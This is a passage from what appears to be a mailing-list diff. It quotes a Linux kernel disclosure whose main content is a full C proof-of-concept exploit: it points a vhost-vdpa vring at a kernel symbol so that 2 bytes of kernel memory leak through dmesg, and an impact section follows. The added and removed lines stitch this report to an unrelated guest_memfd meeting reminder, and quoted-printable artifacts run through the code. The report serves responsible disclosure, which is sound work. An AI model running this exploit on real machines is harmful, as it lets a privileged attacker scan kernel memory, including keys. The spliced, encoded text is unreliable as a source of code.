+>         gh->cmd =3D CTRL_CMD_GETFAMILY;
+>         gh->version =3D 1;
+>         nla_put_str(nlh, sizeof(buf), CTRL_ATTR_FAMILY_NAME, name);
+>         struct sockaddr_nl dst =3D { .nl_family =3D AF_NETLINK };
+>         struct iovec iov =3D { .iov_base =3D nlh, .iov_len =3D nlh->nlmsg=
+_len };
+>         struct msghdr msg =3D { .msg_name =3D &dst, .msg_namelen =3D size=
+of(dst), .msg_iov =3D &iov, .msg_iovlen =3D 1 };
+>         if (sendmsg(nlsock, &msg, 0) < 0) { xp("sendmsg getfamily"); retu=
+rn -1; }
+>         char rbuf[4096];
+>         struct iovec riov =3D { .iov_base =3D rbuf, .iov_len =3D sizeof(r=
+buf) };
+>         struct msghdr rmsg =3D { .msg_name =3D &dst, .msg_namelen =3D siz=
+eof(dst), .msg_iov =3D &riov, .msg_iovlen =3D 1 };
+>         ssize_t n =3D recvmsg(nlsock, &rmsg, 0);
+>         if (n < 0) { xp("recvmsg getfamily"); return -1; }
+>         struct nlmsghdr *r =3D (void *)rbuf;
+>         if (!NLMSG_OK(r, (size_t)n)) return -1;
+>         if (r->nlmsg_type =3D=3D NLMSG_ERROR) { struct nlmsgerr *e =3D NL=
+MSG_DATA(r); fprintf(stderr, "genl getfamily error %d\n", e->error); return=
+ -1; }
+>         int hlen =3D GENL_HDRLEN;
+>         struct nlattr *na =3D (void *)r + NLMSG_HDRLEN + hlen;
+>         int rem =3D (int)(r->nlmsg_len - NLMSG_HDRLEN - hlen);
+>         *fam_id =3D 0;
+>         for (; nla_ok_(na, rem); na =3D nla_next_(na, &rem)) {
+>                 if (na->nla_type =3D=3D CTRL_ATTR_FAMILY_ID) {
+>                         *fam_id =3D *(__u16 *)nla_data_(na);
+>                         return 0;
+>                 }
+>         }
+>         return -1;
+> }
+>
+> static int genl_dev_new(__u16 fam, const char *mgmtdev, const char *devna=
+me)
+> {
+>         char buf[1024];
+>         struct nlmsghdr *nlh =3D (void *)buf;
+>         struct genlmsghdr *gh;
+>         memset(buf, 0, sizeof(buf));
+>         nlh->nlmsg_len =3D NLMSG_LENGTH(sizeof(*gh));
+>         nlh->nlmsg_type =3D fam;
+>         nlh->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK;
+>         nlh->nlmsg_seq =3D ++nlseq;
+>         gh =3D NLMSG_DATA(nlh);
+>         gh->cmd =3D VDPA_CMD_DEV_NEW;
+>         gh->version =3D VDPA_GENL_VERSION;
+>         if (nla_put_str(nlh, sizeof(buf), VDPA_ATTR_MGMTDEV_DEV_NAME, mgm=
+tdev) < 0) return -1;
+>         if (nla_put_str(nlh, sizeof(buf), VDPA_ATTR_DEV_NAME, devname) < =
+0) return -1;
+>         struct sockaddr_nl dst =3D { .nl_family =3D AF_NETLINK };
+>         struct iovec iov =3D { .iov_base =3D nlh, .iov_len =3D nlh->nlmsg=
+_len };
+>         struct msghdr msg =3D { .msg_name =3D &dst, .msg_namelen =3D size=
+of(dst), .msg_iov =3D &iov, .msg_iovlen =3D 1 };
+>         if (sendmsg(nlsock, &msg, 0) < 0) { xp("sendmsg dev_new"); return=
+ -1; }
+>         char rbuf[4096];
+>         struct iovec riov =3D { .iov_base =3D rbuf, .iov_len =3D sizeof(r=
+buf) };
+>         struct msghdr rmsg =3D { .msg_name =3D &dst, .msg_namelen =3D siz=
+eof(dst), .msg_iov =3D &riov, .msg_iovlen =3D 1 };
+>         ssize_t n =3D recvmsg(nlsock, &rmsg, 0);
+>         if (n < 0) { xp("recvmsg dev_new"); return -1; }
+>         struct nlmsghdr *r =3D (void *)rbuf;
+>         if (!NLMSG_OK(r, (size_t)n)) return -1;
+>         if (r->nlmsg_type =3D=3D NLMSG_ERROR) {
+>                 struct nlmsgerr *e =3D NLMSG_DATA(r);
+>                 if (e->error =3D=3D 0)
+>                         return 0;
+>                 fprintf(stderr, "dev_new error %d (%s)\n", e->error, stre=
+rror(-e->error));
+>                 return -1;
+>         }
+>         return 0;
+> }
+>
+> static int genl_dev_del(__u16 fam, const char *devname)
+> {
+>         char buf[1024];
+>         struct nlmsghdr *nlh =3D (void *)buf;
+>         struct genlmsghdr *gh;
+>         memset(buf, 0, sizeof(buf));
+>         nlh->nlmsg_len =3D NLMSG_LENGTH(sizeof(*gh));
+>         nlh->nlmsg_type =3D fam;
+>         nlh->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK;
+>         nlh->nlmsg_seq =3D ++nlseq;
+>         gh =3D NLMSG_DATA(nlh);
+>         gh->cmd =3D VDPA_CMD_DEV_DEL;
+>         gh->version =3D VDPA_GENL_VERSION;
+>         nla_put_str(nlh, sizeof(buf), VDPA_ATTR_DEV_NAME, devname);
+>         struct sockaddr_nl dst =3D { .nl_family =3D AF_NETLINK };
+>         struct iovec iov =3D { .iov_base =3D nlh, .iov_len =3D nlh->nlmsg=
+_len };
+>         struct msghdr msg =3D { .msg_name =3D &dst, .msg_namelen =3D size=
+of(dst), .msg_iov =3D &iov, .msg_iovlen =3D 1 };
+>         sendmsg(nlsock, &msg, 0);
+>         char rbuf[4096]; struct iovec riov =3D { .iov_base =3D rbuf, .iov=
+_len =3D sizeof(rbuf) };
+>         struct msghdr rmsg =3D { .msg_name =3D &dst, .msg_namelen =3D siz=
+eof(dst), .msg_iov =3D &riov, .msg_iovlen =3D 1 };
+>         recvmsg(nlsock, &rmsg, 0);
+>         return 0;
+> }
+>
+> static unsigned long ksym(const char *want)
+> {
+>         FILE *f =3D fopen("/proc/kallsyms", "r");
+>         if (!f) return 0;
+>         char line[512];
+>         unsigned long a =3D 0;
+>         while (fgets(line, sizeof(line), f)) {
+>                 char type; char name[256];
+>                 if (sscanf(line, "%lx %c %255s", &a, &type, name) =3D=3D =
+3) {
+>                         if (strcmp(name, want) =3D=3D 0) { fclose(f); ret=
+urn a; }
+>                 }
+>         }
+>         fclose(f);
+>         return 0;
+> }
+>
+> static int expected_leak(unsigned *out)
+> {
+>         FILE *f =3D fopen("/proc/version", "r");
+>         if (!f) return -1;
+>         char v[256];
+>         if (!fgets(v, sizeof(v), f)) { fclose(f); return -1; }
+>         fclose(f);
+>         int len =3D (int)strlen(v);
+>         if (len < 6) return -1;
+>         unsigned m =3D ((unsigned)(unsigned char)v[4]) | (((unsigned)(uns=
+igned char)v[5]) << 8);
+>         *out =3D m;
+>         fprintf(stderr, "[*] /proc version bytes[4,5] =3D 0x%02x 0x%02x  =
+=3D> expected leak M =3D 0x%04x (%u)\n",
+>                 (unsigned char)v[4], (unsigned char)v[5], m, m);
+>         fprintf(stderr, "[*] /proc/version =3D %.40s\n", v);
+>         return 0;
+> }
+>
+> int main(int argc, char **argv)
+> {
+>         unsigned exp;
+>         if (expected_leak(&exp)) die("cannot read /proc/version");
+>         unsigned long banner =3D ksym("linux_banner");
+>         fprintf(stderr, "[*] linux_banner @ 0x%lx\n", banner);
+>         if (!banner) die("linux_banner not in /proc/kallsyms (need root)"=
+);
+>
+>         nlsock =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
+>         if (nlsock < 0) die("netlink socket");
+>         struct sockaddr_nl sa =3D { .nl_family =3D AF_NETLINK };
+>         if (bind(nlsock, (struct sockaddr *)&sa, sizeof(sa)) < 0) die("ne=
+tlink bind");
+>         __u16 fam;
+>         if (genl_resolve_family(VDPA_GENL_NAME, &fam)) die("resolve genl =
+family 'vdpa' (CONFIG_VDPA?)");
+>         fprintf(stderr, "[*] genl family 'vdpa' id=3D%u\n", fam);
+>         if (genl_dev_new(fam, "vdpasim_blk", "sim0")) die("dev_new vdpasi=
+m_blk (CONFIG_VDPA_SIM_BLOCK?)");
+>         fprintf(stderr, "[*] created vdpa device sim0 (vdpasim_blk)\n");
+>
+>         char path[64]; int vfd =3D -1;
+>         for (int i =3D 0; i < 50; i++) {
+>                 snprintf(path, sizeof(path), "/dev/vhost-vdpa-%d", i);
+>                 vfd =3D open(path, O_RDWR | O_CLOEXEC);
+>                 if (vfd >=3D 0) break;
+>         }
+>         if (vfd < 0) die("open /dev/vhost-vdpa-*");
+>         fprintf(stderr, "[*] opened %s fd=3D%d\n", path, vfd);
+>
+>         int callfd =3D eventfd(0, EFD_CLOEXEC);
+>         int kickfd =3D eventfd(0, EFD_CLOEXEC);
+>         if (callfd < 0 || kickfd < 0) die("eventfd");
+>
+>         if (ioctl(vfd, VHOST_SET_OWNER)) die("VHOST_SET_OWNER");
+>
+>         __u64 bf =3D 0;
+>         if (ioctl(vfd, VHOST_GET_BACKEND_FEATURES, &bf)) xp("get_backend_=
+features");
+>         __u64 setbf =3D bf | (1ULL << VHOST_BACKEND_F_IOTLB_MSG_V2)
+>                        | (1ULL << VHOST_BACKEND_F_IOTLB_BATCH)
+>                        | (1ULL << VHOST_BACKEND_F_IOTLB_ASID)
+>                        | (1ULL << VHOST_BACKEND_F_ENABLE_AFTER_DRIVER_OK)=
+;
+>         if (ioctl(vfd, VHOST_SET_BACKEND_FEATURES, &setbf)) xp("set_backe=
+nd_features");
+>
+>         __u64 feat =3D 0;
+>         if (ioctl(vfd, VHOST_GET_FEATURES, &feat)) die("get_features");
+>         __u64 ack =3D 0;
+>         ack |=3D (1ULL << VIRTIO_F_ACCESS_PLATFORM);
+>         ack |=3D (1ULL << VIRTIO_F_VERSION_1);
+>         ack |=3D (1ULL << VIRTIO_F_ANY_LAYOUT);
+>         ack &=3D feat;
+>         if (!(ack & (1ULL << VIRTIO_F_ACCESS_PLATFORM))) die("ACCESS_PLAT=
+FORM not supported - no use_va?");
+>         if (ioctl(vfd, VHOST_SET_FEATURES, &ack)) die("set_features (need=
+ ACCESS_PLATFORM)");
+>
+>         struct vhost_vring_state vs =3D { .index =3D 0, .num =3D 1 };
+>         if (ioctl(vfd, VHOST_SET_VRING_NUM, &vs)) die("set_vring_num");
+>
+>         size_t pg =3D 4096;
+>         void *descbuf =3D mmap(NULL, pg, PROT_READ|PROT_WRITE, MAP_SHARED=
+|MAP_ANONYMOUS, -1, 0);
+>         void *usedbuf =3D mmap(NULL, pg, PROT_READ|PROT_WRITE, MAP_SHARED=
+|MAP_ANONYMOUS, -1, 0);
+>         if (descbuf =3D=3D MAP_FAILED || usedbuf =3D=3D MAP_FAILED) die("=
+mmap");
+>         memset(descbuf, 0, pg); memset(usedbuf, 0, pg);
+>
+>         struct vhost_vring_addr va =3D {0};
+>         va.index =3D 0;
+>         va.flags =3D 0;
+>         va.desc_user_addr  =3D (uintptr_t)descbuf;
+>         va.avail_user_addr =3D (uintptr_t)banner;   /* <-- KERNEL address=
+, the leak source */
+>         va.used_user_addr  =3D (uintptr_t)usedbuf;
+>         va.log_guest_addr  =3D 0;
+>         if (ioctl(vfd, VHOST_SET_VRING_ADDR, &va)) die("set_vring_addr (a=
+vail=3Dkernel addr rejected?)");
+>
+>         struct vhost_vring_state base =3D { .index =3D 0, .num =3D 0 };
+>         if (ioctl(vfd, VHOST_SET_VRING_BASE, &base)) die("set_vring_base"=
+);
+>
+>         struct vhost_vring_file cf =3D { .index =3D 0, .fd =3D callfd };
+>         if (ioctl(vfd, VHOST_SET_VRING_CALL, &cf)) die("set_vring_call");
+>         struct vhost_vring_file kf =3D { .index =3D 0, .fd =3D kickfd };
+>         if (ioctl(vfd, VHOST_SET_VRING_KICK, &kf)) die("set_vring_kick");
+>
+>         struct vhost_vring_state en =3D { .index =3D 0, .num =3D 1 };
+>         if (ioctl(vfd, VHOST_VDPA_SET_VRING_ENABLE, &en)) die("set_vring_=
+enable");
+>
+>         __u8 status =3D VIRTIO_CONFIG_S_ACKNOWLEDGE | VIRTIO_CONFIG_S_DRI=
+VER
+>                     | VIRTIO_CONFIG_S_FEATURES_OK | VIRTIO_CONFIG_S_DRIVE=
+R_OK;
+>         if (ioctl(vfd, VHOST_VDPA_SET_STATUS, &status)) die("set_status D=
+RIVER_OK");
+>
+>         uint64_t one =3D 1;
+>         if (write(kickfd, &one, sizeof(one)) !=3D sizeof(one)) die("kick =
+write");
+>
+>         unsigned leaked =3D 0; int found =3D 0;
+>         for (int try =3D 0; try < 20 && !found; try++) {
+>                 usleep(100000);
+>                 FILE *d =3D popen("dmesg 2>/dev/null", "r");
+>                 if (d) {
+>                         char l[512];
+>                         while (fgets(l, sizeof(l), d)) {
+>                                 char *p =3D strstr(l, "Guest says index")=
+;
+>                                 if (p) {
+>                                         unsigned idx =3D 0, numv =3D 0;
+>                                         if (sscanf(p, "Guest says index %=
+u > %u is available",
+>                                                    &idx, &numv) >=3D 1) {
+>                                                 leaked =3D idx; found =3D=
+ 1;
+>                                                 fprintf(stderr, "[!!] dme=
+sg: %s", l);
+>                                                 break;
+>                                         }
+>                                 }
+>                         }
+>                         pclose(d);
+>                 }
+>         }
+>
+>         if (!found) {
+>                 fprintf(stderr, "[!] no vringh_bad leak line in dmesg; du=
+mping tail:\n");
+>                 FILE *d =3D popen("dmesg 2>/dev/null | tail -40", "r");
+>                 if (d) { char l[512]; while (fgets(l, sizeof(l), d)) fput=
+s(l, stderr); pclose(d); }
+>                 die("leak not observed (worker may not have run, or use_v=
+a/mm_bound not set)");
+>         }
+>
+>         fprintf(stderr, "\n=3D=3D=3D RESULT =3D=3D=3D\n");
+>         fprintf(stderr, "leaked kernel u16 @ linux_banner+4 =3D 0x%04x (%=
+u)\n", leaked, leaked);
+>         fprintf(stderr, "expected (/proc/version[4,5])     =3D 0x%04x (%u=
+)\n", exp, exp);
+>         if (leaked =3D=3D exp) {
+>                 fprintf(stderr, "MATCH: __get_user read 2 bytes at kernel=
+ addr 0x%lx via vringh.c:1216\n", banner + 4);
+>                 fprintf(stderr, "PROVEN: arbitrary-kernel-address 2-byte =
+read (no access_ok) on unmodified kernel\n");
+>         } else {
+>                 fprintf(stderr, "MISMATCH - investigate\n");
+>         }
+>
+>         status =3D 0; ioctl(vfd, VHOST_VDPA_SET_STATUS, &status);
+>         close(vfd); close(callfd); close(kickfd);
+>         genl_dev_del(fam, "sim0");
+>         return (leaked =3D=3D exp) ? 0 : 2;
+> }
+> ```
+>
+> Captured dmesg from the 7.2.10 run (the disclosed leaked value):
+> ```
+> [    1.882938] vringh:
+> [    1.882944] Guest says index 8312 > 1 is available
+> ```
+>
+> 7. Impact
+> Privileged kernel memory information leak: a CAP_NET_ADMIN controller can
+> read 2 bytes at an arbitrary kernel virtual address per vring kick via
+> __get_user() with no access_ok(), and the value is disclosed to dmesg via
+> vringh_bad(). The read is repeatable, so the whole kernel address space
+> can be scanned 2 bytes at a time (kernel .text/.data, structure contents,
+> in-memory keys). CAP_NET_ADMIN should not grant arbitrary kernel-memory
+> reads. No memory corruption. KASLR does not prevent it (only the address
+> is randomized, the leaked content is constant). Only the use_va mode is
+> affected (the non-use_va path goes through GUP, which has an equivalent
+> check_range guard).
+>
+> Please let me know if you need more detail.
+>
 
-Late reminder. Our next guest_memfd upstream call is scheduled for today,
-Thursday, 2026-10-15 8:00 - 9:00am (GMT-07:00) Pacific Time - Vancouver.
+Can you send a fix patch? It can be AI generated too.
 
-We have a couple of things to discuss on our agenda:
+Thanks!
 
- - 7.4 in-place conversion plans (SNP, CCP fixes)
- - guest_memfd link ioctl
- - Current state of "multiple providers" after LPC
-
-We'll be using the following Google meet:
-http://meet.google.com/wxp-wtju-jzw
-
-The meeting notes can be found at [1], where we also link recordings and
-collect current guest_memfd upstream proposals. If you want an google
-calendar invitation that also covers all future meetings, just write me
-or Ackerley a mail.
-
-To put something to discuss onto the agenda, reply to this mail or add
-them to the "Topics/questions for next meeting(s)" section in the
-meeting notes as a comment.
-
-[1]
-https://docs.google.com/document/d/1M6766BzdY1Lhk7LiR5IqVR8B8mG3cr-cxTxOrAosPOk/edit?usp=sharing
-
--- 
-Cheers,
-
-David
